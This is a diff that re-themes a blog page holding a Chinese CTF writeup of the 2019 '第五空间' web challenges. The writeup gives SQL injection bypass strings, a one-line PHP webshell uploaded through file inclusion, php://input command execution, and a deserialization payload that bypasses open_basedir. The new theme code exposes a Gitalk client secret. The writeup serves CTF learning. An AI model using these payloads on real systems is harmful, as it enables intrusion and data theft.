@@ -1,178 +1,221 @@
 <!DOCTYPE html>
-<html lang="">
-
-
-
-
-
+<html lang>
 <head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="UTF-8">
-  <meta name="google-site-verification" content="fVesNdKs5rVgSDBf0Af0gVcCtxUVEriFBGLGBH2GH8s">
-  <link rel="apple-touch-icon" sizes="76x76" href="https://s2.ax1x.com/2019/10/30/K5JmBF.png">
-  <link rel="icon" type="image/png" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="description" content="Lethe&#39;s Blog">
-  <meta name="author" content="Lethe">
-  <meta name="keywords" content="Lethe&#39;s Blog">
-  <title>第五空间Writeup_Web ~ Lethe&#39;s Blog</title>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
 
-  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.10.2/css/all.min.css">
-<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.3.1/css/bootstrap.min.css">
-<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.8.9/css/mdb.min.css">
-<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+    <meta name="author" content="Lethe">
 
 
-  <link rel="stylesheet" href="/lib/prettify/tomorrow.min.css">
-
-<link rel="stylesheet" href="/css/main.css">
+    <meta name="subtitle" content="Life is a struggle">
 
 
-  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+    <meta name="description" content="Lethe's Blog">
+
+
+    <meta name="keywords" content="Lethe's Blog">
+
+
+<title>第五空间Writeup_Web | Lethe&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
 
 
 </head>
-
-
+<!-- <body background="https://s1.ax1x.com/2020/11/02/Br52e1.jpg"
+      style="background-repeat:no-repeat;
+			 background-size:100% 100%;
+             background-attachment: fixed;"> -->
 <body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">&nbsp;<strong>Lethe's Blog</strong>&nbsp;</a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/">Home</a>
-          </li>
-        
-          
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/archives/">Archives</a>
-          </li>
-        
-          
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/categories/">Categories</a>
-          </li>
-        
-          
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/tags/">Tags</a>
-          </li>
-        
-          
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/about/">About</a>
-          </li>
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-    <div class="view intro-2" id="background"
-         style="background: url('https://s2.ax1x.com/2020/03/11/8k84bQ.jpg')no-repeat center center;
-           background-size: cover;
-           background-attachment: fixed;">
-      <div class="full-bg-img">
-        <div class="mask rgba-black-light flex-center">
-          <div class="container text-center white-text fadeInUp">
-            <span class="h2" id="subtitle">
-              
-            </span>
-
-            
-              <br>
-              
-                <p class="mt-3">
-                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
-                  Sunday, September 1st 2019, 4:33 pm
-                </p>
-              
-
-              <p>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Lethe&#39;s Blog</a></div>
+            <div class="menu navbar-right">
                 
-                  
-                  &nbsp;<i class="far fa-chart-bar"></i>
-                  <span class="post-count">
-                    1.5k 字
-                  </span>&nbsp;
+                    <a class="menu-item" href="/archives">Posts</a>
                 
-
+                    <a class="menu-item" href="/category">Categories</a>
                 
-                  
-                  &nbsp;<i class="far fa-clock"></i>
-                  <span class="post-count">
-                      6 分钟
-                  </span>&nbsp;
+                    <a class="menu-item" href="/tag">Tags</a>
                 
-
+                    <a class="menu-item" href="/about">About</a>
                 
-                  <!-- 不蒜子统计文章PV -->
-                  
-                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
-                  <span id="busuanzi_container_page_pv">
-                    <span id="busuanzi_value_page_pv"></span> 次
-                  </span>&nbsp;
-                
-              </p>
-            
-          </div>
-
-          
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
         </div>
-      </div>
-    </div>
-  </header>
+    </nav>
 
-  <main>
     
-      
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <b><a href="/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a></b>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <b><a class="menu-item" href="/archives">Posts</a></b>
+                
+                    <b><a class="menu-item" href="/category">Categories</a></b>
+                
+                    <b><a class="menu-item" href="/tag">Tags</a></b>
+                
+                    <b><a class="menu-item" href="/about">About</a></b>
+                
+            </div>
+        </div>
+    </nav>
 
-<div class="container-fluid">
-  <div class="row">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-md">
-      <div class="py-5 z-depth-3" id="board">
-        <div class="post-content mx-auto" id="post">
-          <div class="markdown-body">
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <!-- <body style="background-color:rgb(199,237,204);"> -->
+<body style="background-color: RGB(227, 237, 205);">
+<div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">第五空间Writeup_Web</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">September 1, 2019&nbsp;&nbsp;16:33:24</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Writeup/">Writeup</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
             <h1 id="空相"><a href="#空相" class="headerlink" title="空相"></a>空相</h1><p>（1）进入页面，提示了参数id </p>
-<p><img src="/2019/09/01/第五空间Writeup-Web/20190903160325343.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
-<p>（2）尝试一下：?id=1‘<br><img src="/2019/09/01/第五空间Writeup-Web/20190903160348218.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
-<p>（3）访问该文件，并加上队伍的token作为参数即可，<br><img src="/2019/09/01/第五空间Writeup-Web/2019090316072259.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/01/第五空间Writeup-Web/20190903160325343.png" alt="在这里插入图片描述"></p>
+<p>（2）尝试一下：?id=1‘<br><img src="/2019/09/01/第五空间Writeup-Web/20190903160348218.png" alt="在这里插入图片描述"></p>
+<p>（3）访问该文件，并加上队伍的token作为参数即可，<br><img src="/2019/09/01/第五空间Writeup-Web/2019090316072259.png" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h1 id="五叶"><a href="#五叶" class="headerlink" title="五叶"></a>五叶</h1><p>（1）进入后，是一个登陆界面</p>
-<p><img src="/2019/09/01/第五空间Writeup-Web/20190903160801767.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>（2）这一题比较脑洞，实际上是用万能密码来进行登陆admin账号。</p>
+<p><img src="/2019/09/01/第五空间Writeup-Web/20190903160801767.png" alt="在这里插入图片描述"><br>（2）这一题比较脑洞，实际上是用万能密码来进行登陆admin账号。</p>
 <ul>
 <li><p>经过测试：过滤了*、=、and、or、from、select、union、insert、update等，单引号加括号闭合。</p>
 </li>
@@ -183,21 +226,21 @@
 <li><p>拼接后为： <code>….  where password =(‘1’) || username=&#39;admin&#39; --</code></p>
 </li>
 </ul>
-<p><img src="/2019/09/01/第五空间Writeup-Web/2019090316091050.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/01/第五空间Writeup-Web/2019090316091050.png" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h1 id="六尘（非预期）"><a href="#六尘（非预期）" class="headerlink" title="六尘（非预期）"></a>六尘（非预期）</h1><p>（1）扫目录得到/log/</p>
-<p><img src="/2019/09/01/第五空间Writeup-Web/20190903160951628.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/01/第五空间Writeup-Web/20190903160951628.png" alt="在这里插入图片描述"></p>
 <p>（2）访问如下，可以直接看到access.log的内容：</p>
-<p><img src="/2019/09/01/第五空间Writeup-Web/20190903161003750.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/01/第五空间Writeup-Web/20190903161003750.png" alt="在这里插入图片描述"></p>
 <p>（3）在access.log日志中搜索关键词flag，发现存在flagishere目录，访问里面的文件，并替换token即可。</p>
-<p><img src="/2019/09/01/第五空间Writeup-Web/20190903161018938.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/01/第五空间Writeup-Web/20190903161018938.png" alt="在这里插入图片描述"></p>
 <p><strong>预期解</strong>：通过SSRF扫描端口 + gopher协议攻击内网的Struts2，题目环境开的时间太短了，没来得及复现..</p>
 <p><br></p>
-<h1 id="空性"><a href="#空性" class="headerlink" title="空性"></a>空性</h1><p>（1）进入后，是一个登陆界面，发现这里右键查看不了代码（用了一段JS代码实现的），F12或BP抓包看到如下一段JS代码，用户名和密码均为Youguess，但实际上我们直接访问那个文件即可。<br><img src="/2019/09/01/第五空间Writeup-Web/2019090316112880.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<h1 id="空性"><a href="#空性" class="headerlink" title="空性"></a>空性</h1><p>（1）进入后，是一个登陆界面，发现这里右键查看不了代码（用了一段JS代码实现的），F12或BP抓包看到如下一段JS代码，用户名和密码均为Youguess，但实际上我们直接访问那个文件即可。<br><img src="/2019/09/01/第五空间Writeup-Web/2019090316112880.png" alt="在这里插入图片描述"></p>
 <p>（2）访问./151912db206ee052.php，页面上除了显示“听说你的Linux用的很6？”这句话以外，得不到任何有用信息，于是考虑文件泄露。</p>
 <p>Linux下的vim编辑器在非正常退出的情况下会自动生成swp后缀的备份文件，由于此类格式文件无法解析，此时便可以通过浏览器直接下载此敏感文件，这导致程序的源码泄漏。</p>
 <p>（3）于是访问 xxx/.151912db206ee052.php.swp下载文件，并通过命令<code>vi –r [文件名]</code>进行恢复。</p>
-<p><img src="/2019/09/01/第五空间Writeup-Web/20190903161215948.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/01/第五空间Writeup-Web/20190903161215948.png" alt="在这里插入图片描述"></p>
 <p>（4）审计代码如下：</p>
 <pre><code class="php">&lt;?php  
 error_reporting(0);  
@@ -223,13 +266,13 @@ $execfirst -&gt; firstlevel();
 <ul>
 <li><p>利用方式一：PHP伪协议——php://input，所以构造：<code>?fname=php://input</code>，并POST数据：<code>whoami</code></p>
 </li>
-<li><p>利用方式二：变量覆盖——extract()，注意到<code>$a==$content</code>进行的是松散比较，所以构造payload：<code>?a=&amp; fname=lethe</code><br><img src="/2019/09/01/第五空间Writeup-Web/20190903161506717.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<li><p>利用方式二：变量覆盖——extract()，注意到<code>$a==$content</code>进行的是松散比较，所以构造payload：<code>?a=&amp; fname=lethe</code><br><img src="/2019/09/01/第五空间Writeup-Web/20190903161506717.png" alt="在这里插入图片描述"></p>
 </li>
 </ul>
 <p>（5）上一层成功绕过后，会进入到一个上传界面，通过白名单严格的限制了上传文件的后缀，且对文件内容中的eval()、system()、 phpinfo()等许多函数进行了检测，所以想按一般的文件上传getshell是不行的。</p>
 <p> fuzz+脑洞，发现可以上传html后缀的文件，但是上传html文件有什么用呢，并不能解析其中的php代码。</p>
 <p>看到url中的参数有<code>file=xxxxxx</code>这个参数，很像文件包含的题目形式。</p>
-<p><img src="/2019/09/01/第五空间Writeup-Web/20190903161552691.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/01/第五空间Writeup-Web/20190903161552691.png" alt="在这里插入图片描述"></p>
 <p>测试发现<code>http://111.33.164.6:10003/3792689baaabc7eb</code>本身就是一个上传页面，猜测存在文件包含。</p>
 <p>于是构造html文件的内容为：<code>&lt;?php $f = $_GET[f]; $f($_GET[s]); ?&gt;</code>         </p>
 <p>上传后，修改url中file参数的值，<code>?file=upload/xxxxxxxx</code>（上传的文件目录，去掉文件后缀），然后传入相应参数，即可getshell。</p>
@@ -351,298 +394,120 @@ eval()
 <p>同时通过dangerous参数传入命令，注意要用<code>;</code>闭合前面的赋值语句。</p>
 <p>（4）最后在读flag的时候好像还要bypass open_basedir。</p>
 <p>可以参考：<a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/" target="_blank" rel="noopener">从PHP底层看open-basedir-bypass</a></p>
-<p><img src="/2019/09/01/第五空间Writeup-Web/20190903163125433.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/01/第五空间Writeup-Web/20190903163125433.png" alt="在这里插入图片描述"></p>
 <p>最终payload：</p>
 <p><code>?foo=O%3A13%3A%22Welcome_again%22%3A2%3A%7Bs%3A7%3A%22willing%22%3Bi%3A1%3Bs%3A6%3A%22action%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00careful%22%3Bi%3A0%3Bs%3A8%3A%22securuty%22%3Ba%3A1%3A%7Bs%3A9%3A%22say_hello%22%3Bi%3A1%3B%7D%7D%7D&amp;dangerous=1;chdir(&#39;/tmp&#39;);mkdir(&#39;sky&#39;);chdir(&#39;sky&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo(file_get_contents(&#39;/var/www/flag.php&#39;));</code></p>
 
-            <hr>
-          </div>
-          <br>
-          <div>
-            <p>
-            
-              <span>
-                <i class="iconfont icon-inbox"></i>
-                
-                  <a class="hover-with-bg" href="/categories/Writeup">Writeup</a>
-                  &nbsp;
-                
-              </span>&nbsp;&nbsp;
-            
-            
-              <span>
-                <i class="iconfont icon-tag"></i>
-                
-                  <a class="hover-with-bg" href="/tags/Writeup">Writeup</a>
-                
-              </span>
-            
-            </p>
-            
-              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
-            
-          </div>
         </div>
-      </div>
-    </div>
-    <div class="d-none d-lg-block col-lg-2 toc-container">
-      
-  <div id="toc">
-    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
-    <div id="tocbot"></div>
-  </div>
 
-    </div>
-  </div>
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Lethe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://lethe.site/2019/09/01/第五空间Writeup-Web/">https://lethe.site/2019/09/01/第五空间Writeup-Web/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Writeup/"># Writeup</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/09/06/利用SoapClient类进行SSRF-CRLF攻击/">利用SoapClient类进行SSRF+CRLF攻击</a>
+            
+            
+            <a class="next" rel="next" href="/2019/08/26/SUCTF-2019-部分复现/">SUCTF_2019_部分复现</a>
+            
+        </section>
+
+
+    </article>
 </div>
 
-<!-- custom -->
+</body>
 
-
-<!-- Comments -->
-<div class="col-lg-7 mx-auto nopadding-md">
-  <div class="container comments mx-auto" id="comments">
-    
-      <br><br>
-      
-      
-  <div class="disqus" style="width:100%">
-    <div id="disqus_thread"></div>
-    <script>
-      var disqus_config = function () {
-        this.page.url = 'https://lethe.site/2019/09/01/第五空间Writeup-Web/';
-        this.page.identifier = '/2019/09/01/第五空间Writeup-Web/';
-      };
-      var oldLoad = window.onload;
-      window.onload = function () {
-        var d = document, s = d.createElement('script');
-        s.type = 'text/javascript';
-        s.src = '//' + 'Lethe' + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-      };
-    </script>
-    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments
-        powered by Disqus.</a></noscript>
-  </div>
-
-
-    
-  </div>
-</div>
-
-    
-  </main>
-
-  
-    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
-      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
-    </a>
-  
-
-  
-    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-  
-
-  <footer class="mt-5">
-  <div class="text-center py-3">
-    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
-    <i class="iconfont icon-love"></i>
-    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
-    <br>
-
-    
-  
-    <!-- 不蒜子统计PV -->
-    
-    &nbsp;<span id="busuanzi_container_site_pv">总访问量 
-          <span id="busuanzi_value_site_pv"></span> 次</span>&nbsp;
-  
-  
-    <!-- 不蒜子统计UV -->
-    
-    &nbsp;<span id="busuanzi_container_site_uv">总访客数 
-            <span id="busuanzi_value_site_uv"></span> 人</span>&nbsp;
-  
-  <br>
-
-
-
-    
-
-
-    <!-- cnzz Analytics icon -->
-    
-
-  </div>
-</footer>
-
-<!-- SCRIPTS -->
-<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
-<script src="https://cdn.staticfile.org/popper.js/1.15.0/umd/popper.min.js"></script>
-<script src="https://cdn.staticfile.org/twitter-bootstrap/4.3.1/js/bootstrap.min.js"></script>
-<script src="https://cdn.staticfile.org/mdbootstrap/4.8.9/js/mdb.min.js"></script>
-<script src="/js/main.js"></script>
-<script>
-(function(){
-    var bp = document.createElement('script');
-    var curProtocol = window.location.protocol.split(':')[0];
-    if (curProtocol === 'https'){
-   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-  }
-  else{
-  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-  }
-    var s = document.getElementsByTagName("script")[0];
-    s.parentNode.insertBefore(bp, s);
-})();
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'b00b0a7008ebc4264da3',
+        clientSecret: 'd2cd3318af9e2b076eb378ac846e0e37341260ff',
+        repo: 'blog',
+        owner: 'Lethe',
+        admin: 'Lethe',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 10,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
 </script>
 
-  <script src="/js/lazyload.js"></script>
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span><font face="Comic Sans MS">Life is a struggle.</font></span>
+        <br>
+        <span><font face="Comic Sans MS">Lethe © 2018 - 2020</font></span>
+
+        <span> · 
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
 
 
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
 
-  
-    <script src="https://cdn.staticfile.org/tocbot/4.8.0/tocbot.min.js"></script>
-  
-  <script src="/js/post.js"></script>
+          </span>
+    </div>
+</footer>
 
-
-
-  <script src="https://cdn.staticfile.org/smooth-scroll/16.1.0/smooth-scroll.min.js"></script>
-
-
-
-  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-<!-- Plugins -->
-
-
-  
-    <!-- Baidu Analytics -->
-    <script>
-      var _hmt = _hmt || [];
-      (function () {
-        var hm = document.createElement("script");
-        hm.src = "https://hm.baidu.com/hm.js?99792b18d5c4379d7bc5cf4bced8a563";
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(hm, s);
-      })();
-    </script>
-  
-
-  
-
-  
-
-  
-
-  <!-- cnzz Analytics -->
-  
-
-
-
-  <script src="https://cdn.staticfile.org/prettify/r298/prettify.min.js"></script>
-  <script>
-    $(document).ready(function () {
-      $('pre').addClass('prettyprint  ');
-      prettyPrint();
-    })
-  </script>
-
-
-
-  <script src="https://cdn.staticfile.org/typed.js/2.0.10/typed.min.js"></script>
-  <script>
-    var typed = new Typed('#subtitle', {
-      strings: [
-        '  ',
-        "第五空间Writeup_Web&nbsp;",
-      ],
-      cursorChar: "_",
-      typeSpeed: 70,
-      loop: false,
-    });
-    typed.stop();
-    $(document).ready(function () {
-      $(".typed-cursor").addClass("h2");
-      typed.start();
-    });
-  </script>
-
-
-
-  <script src="https://cdn.staticfile.org/anchor-js/4.2.0/anchor.min.js"></script>
-  <script>
-    anchors.options = {
-      placement: "right",
-      visible: "false",
-      
-      icon: "§"
-      
-    };
-    var el = "h1,h2,h3,h4,h5,h6".split(",");
-    var res = [];
-    for (item of el) {
-      res.push(".markdown-body > " + item)
-    }
-    anchors.add(res.join(", "))
-  </script>
-
-
-
-  <script src="/js/local-search.js"></script>
-  <script>
-    var path = "/local-search.xml";
-    var inputArea = document.querySelector("#local-search-input");
-    inputArea.onclick = function () {
-      getSearchFile(path);
-      this.onclick = null
-    }
-  </script>
-
-
-
-  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
-  <script>
-    $("#post img:not(.no-zoom img, img[no-zoom])").each(
-      function () {
-        var element = document.createElement("a");
-        $(element).attr("data-fancybox", "images");
-        $(element).attr("href", $(this).attr("src"));
-        $(this).wrap(element);
-      }
-    );
-  </script>
-
-
-
-
-
-
-
-
-
-
-
+    </div>
 </body>
 </html>
